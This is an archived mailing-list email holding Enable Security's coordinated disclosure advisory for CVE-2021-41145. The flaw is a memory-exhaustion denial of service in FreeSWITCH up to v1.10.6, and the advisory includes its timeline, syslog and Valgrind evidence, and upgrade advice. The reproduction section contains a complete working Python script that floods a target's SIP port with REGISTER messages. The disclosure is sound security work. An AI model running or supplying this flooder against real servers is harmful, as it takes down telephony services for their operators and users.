X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6530" "Monday" "25" "October" "2021" "16:24:13" "+0200" "Sandro Gauci" "sandro@enablesecurity.com" nil "123" "[oss-security] [ES2021-06] FreeSWITCH susceptible to Denial of Service via SIP flooding" nil nil nil "10" nil nil (number mark "U       sandro@enabl Oct 25  123/6530  " thread-indent "\"[oss-security] [ES2021-06] FreeSWITCH susceptible to Denial of Service via SIP flooding\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [ES2021-06] FreeSWITCH susceptible to Denial of Service via SIP flooding" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3956 invoked by uid 550); 25 Oct 2021 14:37:57 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 29867 invoked from network); 25 Oct 2021 14:24:45 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	enablesecurity.com; h=mime-version:message-id:date:from:to
	:subject:content-type; s=fm1; bh=bAfvUXCFSOao9F4CAC2Jy48Otp7I0QD
	0CmDXJoie90I=; b=zvemgUgQgIWe1GkgRKlChIVwLcZR7rHLkm626NEoZYwOXp/
	n2Njeh803WeLxYvjQFNn4II9SP7KWjEG1EsSYQZWEkXaoTzO1qPyVx7jdhyHUK92
	2MKAiumTWVRvrG6c2j1MJBIJLHqZpGgcSVnu0wVThGzN6Pnb3IabFExRgjceI0mO
	DevZaExa9fFIPFp1Sjrh/UxTOJrj5SGsbOsxQ5RPmYtYc2cEaX9gz5gsPoc4xMI1
	A8wK2ahK96EDSeAMBHs/mXznfUSP1xiyU9pp2EaZjZaotLJmBbU7krSPTeOV05u1
	QmlQQkXZbPKJbILbgQoyMmiK2O1bqeyHXffNgEQ==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=content-type:date:from:message-id
	:mime-version:subject:to:x-me-proxy:x-me-proxy:x-me-sender
	:x-me-sender:x-sasl-enc; s=fm1; bh=bAfvUXCFSOao9F4CAC2Jy48Otp7I0
	QD0CmDXJoie90I=; b=cPEHOpdLD7uk66vTJJwSXlxtmDPvgmyKDw4beSCUNOA0k
	46xP5m1xwIFEi/P7gDtYBiS7AKhkxbkpEsEaYGJTO/ALu+PtIN3i2sU27al8yGHh
	vQ38Vo1ksMsS+TTi+R+5niJ2ez284Pyf2tHiOcCf6IX23mhbtIvllpXxSfaKxW+0
	7c97sNKZAbYIpYDqky1fgge83jsnVkMaJlX7LLaECeBnf7Mfa/4TbEKEhoqn1VPj
	aXjIfj0ixJ/DRBsDfu2KDAH1XOnUAMhMnqOKl6DLtBPMg9SHAnU9HrqbsFt0GUwl
	rxr4JQJpJ/XR8BlgK4TDnJGMypDAA7oFEeroB+EMQ==
X-ME-Sender: <xms:Ib52YStyAoAA9ItNnrLefak40jc-ZEkznlAikeYPaF7_O4ZrfgDJzA>
    <xme:Ib52YXdaN4V3BRbhVAcT_1Mb4EazLzMzDhXUifX3QLm-FXHKtXuTAshUDhucQBI1h
    H38t_3f0LXkKgTwFg>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvtddrvdefhedgjeefucetufdoteggodetrfdotf
    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdfqfgfvpdfurfetoffkrfgpnffqhgen
    uceurghilhhouhhtmecufedttdenucenucfjughrpefofgggkfffhffvufgtsehttdertd
    erredtnecuhfhrohhmpedfufgrnhgurhhoucfirghutghifdcuoehsrghnughrohesvghn
    rggslhgvshgvtghurhhithihrdgtohhmqeenucggtffrrghtthgvrhhnpeffleejteekue
    eljeeivdelleevfffhfeejkeeggfevkedvkeffhffhuefhuefhtdenucffohhmrghinhep
    ghhithhhuhgsrdgtohhmpdhvrghlghhrihhnugdrohhrghdpvghnrggslhgvshgvtghurh
    hithihrdgtohhmnecuvehluhhsthgvrhfuihiivgeptdenucfrrghrrghmpehmrghilhhf
    rhhomhepshgrnhgurhhosegvnhgrsghlvghsvggtuhhrihhthidrtghomh
X-ME-Proxy: <xmx:Ib52YdzG7AILb6-EnnqKnNCGTrrdEi6h3nD8Sd3rC5Ju-RJ1rPEZcg>
    <xmx:Ib52YdO_LVnYBRtIoZ0wC1r6PO-If9QKKCGopkz3qmmfexgNtbJFkw>
    <xmx:Ib52YS8Dmh-W8X_lVydujQVzXKETr-K20m3kq2RlydbWor8VY02evA>
    <xmx:Ib52YWY_B2mex2BbmSZM-LI8WWJpAcv_sleTtz2K1NfRb1XBukjGYg>
X-Mailer: MessagingEngine.com Webmail Interface
User-Agent: Cyrus-JMAP/3.5.0-alpha0-1369-gd055fb5e7c-fm-20211018.002-gd055fb5e
Mime-Version: 1.0
Message-Id: <a068d838-f3f9-4793-b336-e56b5cba501d@www.fastmail.com>
Date: Mon, 25 Oct 2021 16:24:13 +0200
From: "Sandro Gauci" <sandro@enablesecurity.com>
To: oss-security@lists.openwall.com, bugtraq@securityfocus.com,
 fulldisclosure@seclists.org, voipsec@voipsa.org,
 submissions@packetstormsecurity.org, vuln@secunia.com, cert@cert.org
Content-Type: text/plain
Subject: [oss-security] [ES2021-06] FreeSWITCH susceptible to Denial of Service via SIP flooding

# FreeSWITCH susceptible to Denial of Service via SIP flooding

- Fixed versions: v1.10.7
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-06-freeswitch-flood-dos
- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-jvpq-23v4-gp3m
- Other references: CVE-2021-41145
- Tested vulnerable versions: <= v1.10.6
- Timeline:
    - Report date: 2021-05-28
    - Triaged: 2021-06-18
    - Fix provided for testing: 2021-10-08
    - Second fix provided for testing: 2021-10-13
    - Vendor release with fix: 2021-10-24
    - Enable Security advisory: 2021-10-25

## Description

When flooding FreeSWITCH with SIP messages, it was observed that after a number of seconds the process was killed by the operating system due to memory exhaustion. The following excerpt from syslog shows one such instance:

```
May 25 15:19:30 ubuntu-bionic kernel: [ 4205.446584] Out of memory: Kill process 22590 (freeswitch) score 939 or sacrifice child
May 25 15:19:30 ubuntu-bionic kernel: [ 4205.449845] Killed process 22590 (freeswitch) total-vm:10484768kB, anon-rss:7894136kB, file-rss:0kB, shmem-rss:0kB
May 25 15:19:30 ubuntu-bionic kernel: [ 4205.720680] oom_reaper: reaped process 22590 (freeswitch), now anon-rss:0kB, file-rss:0kB, shmem-rss:0kB
```

The tests were carried out using the SIP messages REGISTER, SUBSCRIBE, NOTIFY, PUBLISH, MESSAGE, INVITE and OPTIONS. On a machine with 8 gigabytes of RAM, the FreeSWITCH process crashed after 90 seconds of flooding with the SIP message REGISTER.

![Memory consumption over time during SIP flood attack against FreeSWITCH](memory-usage.png)

When FreeSWITCH was run using [Valgrind](https://valgrind.org/), it was reported that large chunks of memory were being allocated in functions from the Sofia-SIP library source file `su_alloc.c`. Valgrind was executed with the flag `--leak-check=full` in order to get a detailed report of potential memory leaks. The target was flooded for a few seconds and then FreeSWITCH was gracefully terminated. The following is an excerpt from the report which identified large numbers of memory allocations in the function `su_home_new` in `su_alloc.c`:

```
2021-05-25 15:23:48.870010 [CONSOLE] switch_core_memory.c:671 Stopping memory pool queue.
==401426== 
==401426== HEAP SUMMARY:
==401426==     in use at exit: 26,039,233 bytes in 87,160 blocks
==401426==   total heap usage: 7,195,625 allocs, 7,108,465 frees, 986,221,122 bytes allocated
==401426== 
...
==401426== 25,718,877 (368 direct, 25,718,509 indirect) bytes in 1 blocks are 
            definitely lost in loss record 367 of 367
==401426==    at 0x483DD99: calloc (in /.../vgpreload_memcheck-amd64-linux.so)
==401426==    by 0x5422B57: su_home_new (su_alloc.c:569)
==401426==    by 0x53AFB16: nua_create (nua.c:146)
==401426==    by 0xA44D4B1: ???
==401426==    by 0x4C054EF: dummy_worker (thread.c:151)
==401426==    by 0x4D19608: start_thread (pthread_create.c:477)
==401426==    by 0x4E55292: clone (clone.S:95)
==401426== 
==401426== LEAK SUMMARY:
==401426==    definitely lost: 3,688 bytes in 35 blocks
==401426==    indirectly lost: 25,728,877 bytes in 86,737 blocks
==401426==      possibly lost: 133,576 bytes in 40 blocks
==401426==    still reachable: 173,092 bytes in 348 blocks
```


## Impact

By abusing this vulnerability, an attacker is able to crash any FreeSWITCH instance by flooding it with SIP messages, leading to Denial of Service. The attack does not require authentication and can be carried out over UDP, TCP or TLS.

## How to reproduce the issue

1. Build FreeSWITCH from source and install it
2. Run FreeSWITCH with the default configuration
3. Save the following Python script as `freeswitch-sipflood.py`

    ```python
    import socket, string, random, sys
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    cseq = 1
    UDP_IP = sys.argv[1]
    UDP_PORT = 5060
    
    while True:
        r = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    
        msg = "REGISTER sip:%s SIP/2.0\r\n" % (UDP_IP, )
        msg += "Via: SIP/2.0/UDP 127.0.0.1:46786;rport;branch=z9hG4bK-%s\r\n" % (r, )
        msg += "Max-Forwards: 70\r\n"
        msg += "From: <sip:98647499@%s>;tag=%s\r\n" % (UDP_IP, r, )
        msg += "To: <sip:98647499@%s>\r\n" % (UDP_IP, )
        msg += "Call-ID: %s\r\n" % (r, )
        msg += "CSeq: %s REGISTER\r\n" % (cseq, )
        msg += "Contact: <sip:98647499@%s:46786;transport=udp>\r\n" % (UDP_IP, )
        msg += "Expires: 60\r\n"
        msg += "Content-Length: 0\r\n"
        msg += "\r\n" 
    
        sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))
    
        cseq += 1
    ```
4. Run the Python script and specify the target IP as the first command line parameter:

    ```bash
    python freeswitch-sipflood.py <target_ip>
    ```
5. Notice that the memory consumption of FreeSWITCH increases rapidly over time, until FreeSWITCH is killed by the underlying operating system

Note that in some cases where the test machine under attack has more memory resources, the attack done over UDP may not succeed in consuming all system memory. During our testing with SIPVicious PRO, however, we could always get the process to consume all the system's memory when the attack is done cover TCP.

## Solution and recommendations

Upgrade to a version of FreeSWITCH that fixes this issue.

Our suggestion to the FreeSWITCH developers was the following:

> Our recommendation for FreeSWITCH developers is to review the code handling memory allocation and apply changes to address this issue. At Enable Security we're happy to test potential fixes for this issue.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

